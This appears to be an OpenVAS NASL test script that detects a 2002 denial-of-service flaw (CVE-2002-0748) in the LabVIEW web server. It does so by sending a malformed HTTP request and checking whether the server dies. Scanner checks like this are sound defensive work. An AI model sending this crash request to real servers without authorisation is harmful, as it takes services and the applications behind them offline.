# OpenVAS Vulnerability Test
# $Id: labview_www_DoS.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: LabView web server DoS
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
# Erik Anderson <eanders@carmichaelsecurity.com>
# Added BugtraqID and CAN
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to kill the web server by
sending a request that ends with two LF characters instead of 
the normal sequence CR LF CR LF 
(CR = carriage return, LF = line feed).

A cracker may exploit this vulnerability to make this server and
all LabViews applications crash continually.

Workaround : upgrade your LabView software or run the web server with logging
disabled";

# References:
# From: "Steve Zins" <steve@iLabVIEW.com>
# To: bugtraq@securityfocus.com
# Subject: LabVIEW Web Server DoS Vulnerability
# Date: Mon, 22 Apr 2002 22:51:39 -0700

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.11063");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(4577);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2002-0748");
 name = "LabView web server DoS";
 script_name(name);
 

 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 script_family(family);
 script_require_ports("Services/www", 80);
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("LabVIEW/banner");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

########


include("http_func.inc");

data = string("GET / HTTP/1.0\n\n");

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(0);
banner = get_http_banner(port:port);
if(!banner)exit(0);
if("Server: LabVIEW" >!< banner)exit(0);

if(get_port_state(port))
{
  soc = http_open_socket(port);
  if(soc)
  {
  data = string("GET / HTTP/1.0", "\r\n",
                "Host: ", get_host_name(), "\r\n");
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  close(soc);
  sleep(1);
  if(http_is_dead(port: port,retry:2))security_message(port);
  }
}
